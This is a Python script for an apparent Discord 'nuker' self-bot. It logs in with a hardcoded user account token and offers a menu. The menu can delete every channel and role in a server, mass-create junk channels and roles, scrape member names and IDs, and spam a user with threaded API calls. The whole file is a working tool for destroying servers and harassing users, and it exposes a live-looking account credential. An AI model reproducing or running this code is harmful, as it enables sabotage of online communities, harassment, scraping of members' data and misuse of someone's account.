import asyncio
import requests
import json
import discord
from discord.ext import commands
import time
from colorama import Fore, Back, Style
import colorama
import random
import os
import sys
import re
import threading
from datetime import datetime




intents = discord.Intents.all()
bot = commands.Bot(command_prefix="$",self_bot=True,intents=intents)
colorama.init(autoreset=True) 
SKIP_BOTS = True
clear = str('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')

headers = {'Authorization': 'NzMwNDg3NTAzMDkzNDk3OTk3.YK57ZQ.Bf3hDg32X83Jq8OEfDWvVhaOVcE'}


colours = [16711680,2424576,65522,3071,16711922,16383744,16758528,9807270]







@bot.event
async def on_ready():
    print(f"logged in as {Fore.GREEN}{bot.user.name}#{bot.user.discriminator}")
    while True:


    
  
        
        op = input("""
        1 = nuke
        2 = createchan
        3 = scrape
        4 = yes
        5 = CSreateRole
        6 = DeleteRole
        """)



        
        

        def nuke(guild,channel):
            try:

                while True:

                    
                    r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
                    if 'retry_after' in r.text:
                        print(f"{Fore.CYAN}Sleeping for {Fore.GREEN}{str(r.json()['retry_after'])} {Fore.CYAN}seconds " ,)
                        time.sleep(r.json()['retry_after'])
                    else:
                        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                            print('deleted channel', sep=' ',  flush=True)

                            break
                        else:
                            print('cant delete mate')
                            break

                   
                    

            except:
                print('nah g')
                pass

                    

                        
        
                 

        def createchan(guild,channelName):
            while True:
                typ = random.choice([0,0])
                payload = {'name' : channelName , 'type': typ}
                r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels',headers=headers , json=payload)
                if 'retry_after' in r.text:
                    print(f"sleeping for {str(r.json()['retry_after'])}")
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(f'{Fore.GREEN}created channel', sep=' ', end='')
                        
                        break
                    else:
                        break

        def croles(guild,RoleName):
            indx = random.randint(0,7)
            payload = {"name":RoleName,"color":colours[indx],"permissions":"0"}
            while True:
                r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/roles',headers=headers,json=payload)
                if 'retry_after' in r.text:
                    print(f"sleeping for {str(r.json()['retry_after'])}")
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(f'{Fore.GREEN}created role')
                        
                        break
                    else:
                        break

        def droles(guild,roles):
            while True:
                r = requests.delete(f'https://discord.com/api/v9/guilds/{guild}/roles/{roles}',headers=headers)
                if 'retry_after' in r.text:
                    print(f"sleeping for {str(r.json()['retry_after'])}")
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(f'{Fore.GREEN}deleted role')
                        
                        break
                    else:
                        break

        def message(user,message):
            while True:
                payload = {"content":message}
                r = requests.post(f'https://discord.com/api/v9/channels/{user}/messages',headers=headers , json=payload)
                if 'retry_after' in r.text:
                    print(f"sleeping for {str(r.json()['retry_after'])}")
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(f'{Fore.GREEN}deleted role')
                        
                        break
                    else:
                        break
         






        











        async def scraper(guildID):
            global memberLIST
            global channelLIST
            global roleLIST
            global memberNames

            global roleCount
            global channelCount
            global memberCount

            guildOBJ = bot.get_guild(int(guildID))
            members = await guildOBJ.chunk()
            memberNames = []
            memberLIST = []
            channelLIST = []
            roleLIST = []

            roleCount = 0
            channelCount = 0
            memberCount = 0

            for member in members:
                memberCount += 1
                memberLIST.append(member.id)
                memberNames.append(member.name)

            for role in guildOBJ.roles:
                roleCount += 1
                roleLIST.append(role.id)

            for channel in guildOBJ.channels:
                channelCount += 1
                channelLIST.append(channel.id)   

        async def delchan():
            ask = int(input('enter guild ID : '))
            await scraper(ask)
            for i in channelLIST:
                threading.Thread(target=nuke , args=(ask,i)).start() 

        async def chancreate():
            ask = int(input('enter guild id : '))
            askk = input('enter channel name : ')
            amount = int(input('enter amount of channels : '))
            for i in range(amount):
                threading.Thread(target=createchan , args=(ask,askk)).start()
         
                

        async def scrape():
            ask = int(input('enter guild id : '))
            await scraper(ask)
            for i in channelLIST:
                print(i)
            for mem in memberNames:
                print(mem)

        async def yes():
            ask = int(input(f'{Fore.YELLOW}enter guild id : '))
            askk = input(f'{Fore.CYAN}enter channel names : ')
            amount = int(input('enter amount of channels : '))
            role_name = input('enter roles name : ')
            amountt = int(input('enter amount of roles : '))
            await scraper(ask)
            for i in channelLIST:
                threading.Thread(target=nuke,args=(ask,i)).start()
            
            
            for i in range(amount):
                threading.Thread(target=createchan , args=(ask,askk)).start()

            for i in roleLIST:
                threading.Thread(target=droles,args=(ask,i))

            for i in range(amountt):
                threading.Thread(target=croles,args=(ask,role_name)).start()


            
                

        async def createrole():
            ask = int(input(f'enter guild id : '))
            askk = input(f'enter role names : ')
            amount = int(input(f'enter amount of roles : '))
            await scraper(ask)
            for i in range(amount):
                threading.Thread(target=croles,args=(ask,askk)).start()

        async def deleterole():
            ask = int(input(f'enter guild id : '))
            await scraper(ask)
            for i in roleLIST:
                threading.Thread(target=droles,args=(ask,i)).start()

        async def spam():
            ask = int(input(f'enter user id : '))
            mess = input('enter message : ')
            amount = int(input('enter amount of messages : '))
            for i in range(amount):
                threading.Thread(target=message,args=(ask,mess)).start()

                



                



                

            
        if op == '1':
            await delchan()
        
        if op == '2':
            await chancreate()

        if op == '3':
            await scrape()
        
        if op == '4':
            await  yes()

        if op == '5':
            await createrole()

        if op == '6':
            await deleterole()

        if op == '7':
            await spam()
       








bot.run('NzMwNDg3NTAzMDkzNDk3OTk3.YK57ZQ.Bf3hDg32X83Jq8OEfDWvVhaOVcE',bot=False)
